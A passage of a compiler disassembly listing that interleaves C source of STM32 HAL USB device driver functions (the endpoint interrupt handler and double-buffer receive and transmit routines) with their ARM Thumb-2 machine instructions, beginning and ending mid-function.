#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002c6c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002c70:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002c74:	2b00      	cmp	r3, #0
 8002c76:	d144      	bne.n	8002d02 <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002c78:	687b      	ldr	r3, [r7, #4]
 8002c7a:	681b      	ldr	r3, [r3, #0]
 8002c7c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c80:	b29b      	uxth	r3, r3
 8002c82:	461a      	mov	r2, r3
 8002c84:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c86:	781b      	ldrb	r3, [r3, #0]
 8002c88:	00db      	lsls	r3, r3, #3
 8002c8a:	4413      	add	r3, r2
 8002c8c:	687a      	ldr	r2, [r7, #4]
 8002c8e:	6812      	ldr	r2, [r2, #0]
 8002c90:	4413      	add	r3, r2
 8002c92:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002c96:	881b      	ldrh	r3, [r3, #0]
 8002c98:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c9c:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002ca0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ca2:	699a      	ldr	r2, [r3, #24]
 8002ca4:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002ca8:	429a      	cmp	r2, r3
 8002caa:	d907      	bls.n	8002cbc <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002cac:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cae:	699a      	ldr	r2, [r3, #24]
 8002cb0:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002cb4:	1ad2      	subs	r2, r2, r3
 8002cb6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cb8:	619a      	str	r2, [r3, #24]
 8002cba:	e002      	b.n	8002cc2 <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
 8002cbc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cbe:	2200      	movs	r2, #0
 8002cc0:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002cc2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cc4:	699b      	ldr	r3, [r3, #24]
 8002cc6:	2b00      	cmp	r3, #0
 8002cc8:	d106      	bne.n	8002cd8 <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002cca:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ccc:	781b      	ldrb	r3, [r3, #0]
 8002cce:	4619      	mov	r1, r3
 8002cd0:	6878      	ldr	r0, [r7, #4]
 8002cd2:	f009 fe46 	bl	800c962 <HAL_PCD_DataInStageCallback>
 8002cd6:	e01b      	b.n	8002d10 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
 8002cd8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cda:	695a      	ldr	r2, [r3, #20]
 8002cdc:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002ce0:	441a      	add	r2, r3
 8002ce2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ce4:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002ce6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ce8:	69da      	ldr	r2, [r3, #28]
 8002cea:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002cee:	441a      	add	r2, r3
 8002cf0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cf2:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002cf4:	687b      	ldr	r3, [r7, #4]
 8002cf6:	681b      	ldr	r3, [r3, #0]
 8002cf8:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002cfa:	4618      	mov	r0, r3
 8002cfc:	f003 fec3 	bl	8006a86 <USB_EPStartXfer>
 8002d00:	e006      	b.n	8002d10 <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002d02:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002d06:	461a      	mov	r2, r3
 8002d08:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002d0a:	6878      	ldr	r0, [r7, #4]
 8002d0c:	f000 f917 	bl	8002f3e <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002d10:	687b      	ldr	r3, [r7, #4]
 8002d12:	681b      	ldr	r3, [r3, #0]
 8002d14:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002d18:	b29b      	uxth	r3, r3
 8002d1a:	b21b      	sxth	r3, r3
 8002d1c:	2b00      	cmp	r3, #0
 8002d1e:	f6ff ac45 	blt.w	80025ac <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002d22:	2300      	movs	r3, #0
}
 8002d24:	4618      	mov	r0, r3
 8002d26:	3758      	adds	r7, #88	; 0x58
 8002d28:	46bd      	mov	sp, r7
 8002d2a:	bd80      	pop	{r7, pc}

08002d2c <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002d2c:	b580      	push	{r7, lr}
 8002d2e:	b088      	sub	sp, #32
 8002d30:	af00      	add	r7, sp, #0
 8002d32:	60f8      	str	r0, [r7, #12]
 8002d34:	60b9      	str	r1, [r7, #8]
 8002d36:	4613      	mov	r3, r2
 8002d38:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002d3a:	88fb      	ldrh	r3, [r7, #6]
 8002d3c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002d40:	2b00      	cmp	r3, #0
 8002d42:	d07c      	beq.n	8002e3e <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002d44:	68fb      	ldr	r3, [r7, #12]
 8002d46:	681b      	ldr	r3, [r3, #0]
 8002d48:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002d4c:	b29b      	uxth	r3, r3
 8002d4e:	461a      	mov	r2, r3
 8002d50:	68bb      	ldr	r3, [r7, #8]
 8002d52:	781b      	ldrb	r3, [r3, #0]
 8002d54:	00db      	lsls	r3, r3, #3
 8002d56:	4413      	add	r3, r2
 8002d58:	68fa      	ldr	r2, [r7, #12]
 8002d5a:	6812      	ldr	r2, [r2, #0]
 8002d5c:	4413      	add	r3, r2
 8002d5e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002d62:	881b      	ldrh	r3, [r3, #0]
 8002d64:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002d68:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002d6a:	68bb      	ldr	r3, [r7, #8]
 8002d6c:	699a      	ldr	r2, [r3, #24]
 8002d6e:	8b7b      	ldrh	r3, [r7, #26]
 8002d70:	429a      	cmp	r2, r3
 8002d72:	d306      	bcc.n	8002d82 <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002d74:	68bb      	ldr	r3, [r7, #8]
 8002d76:	699a      	ldr	r2, [r3, #24]
 8002d78:	8b7b      	ldrh	r3, [r7, #26]
 8002d7a:	1ad2      	subs	r2, r2, r3
 8002d7c:	68bb      	ldr	r3, [r7, #8]
 8002d7e:	619a      	str	r2, [r3, #24]
 8002d80:	e002      	b.n	8002d88 <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002d82:	68bb      	ldr	r3, [r7, #8]
 8002d84:	2200      	movs	r2, #0
 8002d86:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002d88:	68bb      	ldr	r3, [r7, #8]
 8002d8a:	699b      	ldr	r3, [r3, #24]
 8002d8c:	2b00      	cmp	r3, #0
 8002d8e:	d123      	bne.n	8002dd8 <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002d90:	68fb      	ldr	r3, [r7, #12]
 8002d92:	681b      	ldr	r3, [r3, #0]
 8002d94:	461a      	mov	r2, r3
 8002d96:	68bb      	ldr	r3, [r7, #8]
 8002d98:	781b      	ldrb	r3, [r3, #0]
 8002d9a:	009b      	lsls	r3, r3, #2
 8002d9c:	4413      	add	r3, r2
 8002d9e:	881b      	ldrh	r3, [r3, #0]
 8002da0:	b29b      	uxth	r3, r3
 8002da2:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002da6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002daa:	833b      	strh	r3, [r7, #24]
 8002dac:	8b3b      	ldrh	r3, [r7, #24]
 8002dae:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002db2:	833b      	strh	r3, [r7, #24]
 8002db4:	68fb      	ldr	r3, [r7, #12]
 8002db6:	681b      	ldr	r3, [r3, #0]
 8002db8:	461a      	mov	r2, r3
 8002dba:	68bb      	ldr	r3, [r7, #8]
 8002dbc:	781b      	ldrb	r3, [r3, #0]
 8002dbe:	009b      	lsls	r3, r3, #2
 8002dc0:	441a      	add	r2, r3
 8002dc2:	8b3b      	ldrh	r3, [r7, #24]
 8002dc4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002dc8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002dcc:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002dd0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002dd4:	b29b      	uxth	r3, r3
 8002dd6:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002dd8:	88fb      	ldrh	r3, [r7, #6]
 8002dda:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002dde:	2b00      	cmp	r3, #0
 8002de0:	d01f      	beq.n	8002e22 <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002de2:	68fb      	ldr	r3, [r7, #12]
 8002de4:	681b      	ldr	r3, [r3, #0]
 8002de6:	461a      	mov	r2, r3
 8002de8:	68bb      	ldr	r3, [r7, #8]
 8002dea:	781b      	ldrb	r3, [r3, #0]
 8002dec:	009b      	lsls	r3, r3, #2
 8002dee:	4413      	add	r3, r2
 8002df0:	881b      	ldrh	r3, [r3, #0]
 8002df2:	b29b      	uxth	r3, r3
 8002df4:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002df8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002dfc:	82fb      	strh	r3, [r7, #22]
 8002dfe:	68fb      	ldr	r3, [r7, #12]
 8002e00:	681b      	ldr	r3, [r3, #0]
 8002e02:	461a      	mov	r2, r3
 8002e04:	68bb      	ldr	r3, [r7, #8]
 8002e06:	781b      	ldrb	r3, [r3, #0]
 8002e08:	009b      	lsls	r3, r3, #2
 8002e0a:	441a      	add	r2, r3
 8002e0c:	8afb      	ldrh	r3, [r7, #22]
 8002e0e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002e12:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002e16:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002e1a:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002e1e:	b29b      	uxth	r3, r3
 8002e20:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002e22:	8b7b      	ldrh	r3, [r7, #26]
 8002e24:	2b00      	cmp	r3, #0
 8002e26:	f000 8085 	beq.w	8002f34 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002e2a:	68fb      	ldr	r3, [r7, #12]
 8002e2c:	6818      	ldr	r0, [r3, #0]
 8002e2e:	68bb      	ldr	r3, [r7, #8]
 8002e30:	6959      	ldr	r1, [r3, #20]
 8002e32:	68bb      	ldr	r3, [r7, #8]
 8002e34:	891a      	ldrh	r2, [r3, #8]
 8002e36:	8b7b      	ldrh	r3, [r7, #26]
 8002e38:	f005 fb73 	bl	8008522 <USB_ReadPMA>
 8002e3c:	e07a      	b.n	8002f34 <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002e3e:	68fb      	ldr	r3, [r7, #12]
 8002e40:	681b      	ldr	r3, [r3, #0]
 8002e42:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002e46:	b29b      	uxth	r3, r3
 8002e48:	461a      	mov	r2, r3
 8002e4a:	68bb      	ldr	r3, [r7, #8]
 8002e4c:	781b      	ldrb	r3, [r3, #0]
 8002e4e:	00db      	lsls	r3, r3, #3
 8002e50:	4413      	add	r3, r2
 8002e52:	68fa      	ldr	r2, [r7, #12]
 8002e54:	6812      	ldr	r2, [r2, #0]
 8002e56:	4413      	add	r3, r2
 8002e58:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002e5c:	881b      	ldrh	r3, [r3, #0]
 8002e5e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002e62:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002e64:	68bb      	ldr	r3, [r7, #8]
 8002e66:	699a      	ldr	r2, [r3, #24]
 8002e68:	8b7b      	ldrh	r3, [r7, #26]
 8002e6a:	429a      	cmp	r2, r3
 8002e6c:	d306      	bcc.n	8002e7c <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 8002e6e:	68bb      	ldr	r3, [r7, #8]
 8002e70:	699a      	ldr	r2, [r3, #24]
 8002e72:	8b7b      	ldrh	r3, [r7, #26]
 8002e74:	1ad2      	subs	r2, r2, r3
 8002e76:	68bb      	ldr	r3, [r7, #8]
 8002e78:	619a      	str	r2, [r3, #24]
 8002e7a:	e002      	b.n	8002e82 <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 8002e7c:	68bb      	ldr	r3, [r7, #8]
 8002e7e:	2200      	movs	r2, #0
 8002e80:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002e82:	68bb      	ldr	r3, [r7, #8]
 8002e84:	699b      	ldr	r3, [r3, #24]
 8002e86:	2b00      	cmp	r3, #0
 8002e88:	d123      	bne.n	8002ed2 <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002e8a:	68fb      	ldr	r3, [r7, #12]
 8002e8c:	681b      	ldr	r3, [r3, #0]
 8002e8e:	461a      	mov	r2, r3
 8002e90:	68bb      	ldr	r3, [r7, #8]
 8002e92:	781b      	ldrb	r3, [r3, #0]
 8002e94:	009b      	lsls	r3, r3, #2
 8002e96:	4413      	add	r3, r2
 8002e98:	881b      	ldrh	r3, [r3, #0]
 8002e9a:	b29b      	uxth	r3, r3
 8002e9c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002ea0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002ea4:	83fb      	strh	r3, [r7, #30]
 8002ea6:	8bfb      	ldrh	r3, [r7, #30]
 8002ea8:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002eac:	83fb      	strh	r3, [r7, #30]
 8002eae:	68fb      	ldr	r3, [r7, #12]
 8002eb0:	681b      	ldr	r3, [r3, #0]
 8002eb2:	461a      	mov	r2, r3
 8002eb4:	68bb      	ldr	r3, [r7, #8]
 8002eb6:	781b      	ldrb	r3, [r3, #0]
 8002eb8:	009b      	lsls	r3, r3, #2
 8002eba:	441a      	add	r2, r3
 8002ebc:	8bfb      	ldrh	r3, [r7, #30]
 8002ebe:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002ec2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002ec6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002eca:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002ece:	b29b      	uxth	r3, r3
 8002ed0:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 8002ed2:	88fb      	ldrh	r3, [r7, #6]
 8002ed4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002ed8:	2b00      	cmp	r3, #0
 8002eda:	d11f      	bne.n	8002f1c <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002edc:	68fb      	ldr	r3, [r7, #12]
 8002ede:	681b      	ldr	r3, [r3, #0]
 8002ee0:	461a      	mov	r2, r3
 8002ee2:	68bb      	ldr	r3, [r7, #8]
 8002ee4:	781b      	ldrb	r3, [r3, #0]
 8002ee6:	009b      	lsls	r3, r3, #2
 8002ee8:	4413      	add	r3, r2
 8002eea:	881b      	ldrh	r3, [r3, #0]
 8002eec:	b29b      	uxth	r3, r3
 8002eee:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002ef2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002ef6:	83bb      	strh	r3, [r7, #28]
 8002ef8:	68fb      	ldr	r3, [r7, #12]
 8002efa:	681b      	ldr	r3, [r3, #0]
 8002efc:	461a      	mov	r2, r3
 8002efe:	68bb      	ldr	r3, [r7, #8]
 8002f00:	781b      	ldrb	r3, [r3, #0]
 8002f02:	009b      	lsls	r3, r3, #2
 8002f04:	441a      	add	r2, r3
 8002f06:	8bbb      	ldrh	r3, [r7, #28]
 8002f08:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002f0c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002f10:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002f14:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002f18:	b29b      	uxth	r3, r3
 8002f1a:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002f1c:	8b7b      	ldrh	r3, [r7, #26]
 8002f1e:	2b00      	cmp	r3, #0
 8002f20:	d008      	beq.n	8002f34 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002f22:	68fb      	ldr	r3, [r7, #12]
 8002f24:	6818      	ldr	r0, [r3, #0]
 8002f26:	68bb      	ldr	r3, [r7, #8]
 8002f28:	6959      	ldr	r1, [r3, #20]
 8002f2a:	68bb      	ldr	r3, [r7, #8]
 8002f2c:	895a      	ldrh	r2, [r3, #10]
 8002f2e:	8b7b      	ldrh	r3, [r7, #26]
 8002f30:	f005 faf7 	bl	8008522 <USB_ReadPMA>
    }
  }

  return count;
 8002f34:	8b7b      	ldrh	r3, [r7, #26]
}
 8002f36:	4618      	mov	r0, r3
 8002f38:	3720      	adds	r7, #32
 8002f3a:	46bd      	mov	sp, r7
 8002f3c:	bd80      	pop	{r7, pc}

08002f3e <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002f3e:	b580      	push	{r7, lr}
 8002f40:	b0a4      	sub	sp, #144	; 0x90
 8002f42:	af00      	add	r7, sp, #0
 8002f44:	60f8      	str	r0, [r7, #12]
 8002f46:	60b9      	str	r1, [r7, #8]
 8002f48:	4613      	mov	r3, r2
 8002f4a:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002f4c:	88fb      	ldrh	r3, [r7, #6]
 8002f4e:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002f52:	2b00      	cmp	r3, #0
 8002f54:	f000 81db 	beq.w	800330e <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002f58:	68fb      	ldr	r3, [r7, #12]
 8002f5a:	681b      	ldr	r3, [r3, #0]
 8002f5c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f60:	b29b      	uxth	r3, r3
 8002f62:	461a      	mov	r2, r3
 8002f64:	68bb      	ldr	r3, [r7, #8]
 8002f66:	781b      	ldrb	r3, [r3, #0]
 8002f68:	00db      	lsls	r3, r3, #3
 8002f6a:	4413      	add	r3, r2
 8002f6c:	68fa      	ldr	r2, [r7, #12]
 8002f6e:	6812      	ldr	r2, [r2, #0]
 8002f70:	4413      	add	r3, r2
 8002f72:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f76:	881b      	ldrh	r3, [r3, #0]
 8002f78:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f7c:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 8002f80:	68bb      	ldr	r3, [r7, #8]
 8002f82:	699a      	ldr	r2, [r3, #24]
 8002f84:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f88:	429a      	cmp	r2, r3
 8002f8a:	d907      	bls.n	8002f9c <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 8002f8c:	68bb      	ldr	r3, [r7, #8]
 8002f8e:	699a      	ldr	r2, [r3, #24]
 8002f90:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f94:	1ad2      	subs	r2, r2, r3
 8002f96:	68bb      	ldr	r3, [r7, #8]
 8002f98:	619a      	str	r2, [r3, #24]
 8002f9a:	e002      	b.n	8002fa2 <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 8002f9c:	68bb      	ldr	r3, [r7, #8]
 8002f9e:	2200      	movs	r2, #0
 8002fa0:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 8002fa2:	68bb      	ldr	r3, [r7, #8]
 8002fa4:	699b      	ldr	r3, [r3, #24]
 8002fa6:	2b00      	cmp	r3, #0
 8002fa8:	f040 80b9 	bne.w	800311e <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002fac:	68bb      	ldr	r3, [r7, #8]
 8002fae:	785b      	ldrb	r3, [r3, #1]
 8002fb0:	2b00      	cmp	r3, #0
 8002fb2:	d126      	bne.n	8003002 <HAL_PCD_EP_DB_Transmit+0xc4>
 8002fb4:	68fb      	ldr	r3, [r7, #12]
 8002fb6:	681b      	ldr	r3, [r3, #0]
 8002fb8:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002fba:	68fb      	ldr	r3, [r7, #12]
 8002fbc:	681b      	ldr	r3, [r3, #0]
 8002fbe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002fc2:	b29b      	uxth	r3, r3
 8002fc4:	461a      	mov	r2, r3
 8002fc6:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002fc8:	4413      	add	r3, r2
 8002fca:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002fcc:	68bb      	ldr	r3, [r7, #8]
 8002fce:	781b      	ldrb	r3, [r3, #0]
 8002fd0:	00da      	lsls	r2, r3, #3
 8002fd2:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002fd4:	4413      	add	r3, r2
 8002fd6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002fda:	62bb      	str	r3, [r7, #40]	; 0x28
 8002fdc:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002fde:	881b      	ldrh	r3, [r3, #0]
 8002fe0:	b29b      	uxth	r3, r3
 8002fe2:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002fe6:	b29a      	uxth	r2, r3
 8002fe8:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002fea:	801a      	strh	r2, [r3, #0]
 8002fec:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002fee:	881b      	ldrh	r3, [r3, #0]
 8002ff0:	b29b      	uxth	r3, r3
 8002ff2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002ff6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002ffa:	b29a      	uxth	r2, r3
 8002ffc:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002ffe:	801a      	strh	r2, [r3, #0]
 8003000:	e01a      	b.n	8003038 <HAL_PCD_EP_DB_Transmit+0xfa>
 8003002:	68bb      	ldr	r3, [r7, #8]
 8003004:	785b      	ldrb	r3, [r3, #1]
 8003006:	2b01      	cmp	r3, #1
 8003008:	d116      	bne.n	8003038 <HAL_PCD_EP_DB_Transmit+0xfa>
 800300a:	68fb      	ldr	r3, [r7, #12]
 800300c:	681b      	ldr	r3, [r3, #0]
 800300e:	637b      	str	r3, [r7, #52]	; 0x34
 8003010:	68fb      	ldr	r3, [r7, #12]
 8003012:	681b      	ldr	r3, [r3, #0]
 8003014:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003018:	b29b      	uxth	r3, r3
 800301a:	461a      	mov	r2, r3
 800301c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800301e:	4413      	add	r3, r2
 8003020:	637b      	str	r3, [r7, #52]	; 0x34
 8003022:	68bb      	ldr	r3, [r7, #8]
 8003024:	781b      	ldrb	r3, [r3, #0]
 8003026:	00da      	lsls	r2, r3, #3
 8003028:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800302a:	4413      	add	r3, r2
 800302c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003030:	633b      	str	r3, [r7, #48]	; 0x30
 8003032:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8003034:	2200      	movs	r2, #0
 8003036:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003038:	68fb      	ldr	r3, [r7, #12]
 800303a:	681b      	ldr	r3, [r3, #0]
 800303c:	627b      	str	r3, [r7, #36]	; 0x24
 800303e:	68bb      	ldr	r3, [r7, #8]
 8003040:	785b      	ldrb	r3, [r3, #1]
 8003042:	2b00      	cmp	r3, #0
 8003044:	d126      	bne.n	8003094 <HAL_PCD_EP_DB_Transmit+0x156>
 8003046:	68fb      	ldr	r3, [r7, #12]
 8003048:	681b      	ldr	r3, [r3, #0]
 800304a:	61fb      	str	r3, [r7, #28]
 800304c:	68fb      	ldr	r3, [r7, #12]
 800304e:	681b      	ldr	r3, [r3, #0]
 8003050:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003054:	b29b      	uxth	r3, r3
 8003056:	461a      	mov	r2, r3
 8003058:	69fb      	ldr	r3, [r7, #28]
 800305a:	4413      	add	r3, r2
 800305c:	61fb      	str	r3, [r7, #28]
 800305e:	68bb      	ldr	r3, [r7, #8]
 8003060:	781b      	ldrb	r3, [r3, #0]
 8003062:	00da      	lsls	r2, r3, #3
 8003064:	69fb      	ldr	r3, [r7, #28]
 8003066:	4413      	add	r3, r2
 8003068:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800306c:	61bb      	str	r3, [r7, #24]
 800306e:	69bb      	ldr	r3, [r7, #24]
 8003070:	881b      	ldrh	r3, [r3, #0]
 8003072:	b29b      	uxth	r3, r3
 8003074:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003078:	b29a      	uxth	r2, r3
 800307a:	69bb      	ldr	r3, [r7, #24]
 800307c:	801a      	strh	r2, [r3, #0]
 800307e:	69bb      	ldr	r3, [r7, #24]
 8003080:	881b      	ldrh	r3, [r3, #0]
 8003082:	b29b      	uxth	r3, r3
 8003084:	ea6f 4343 	mvn.w	r3, r3, lsl #17
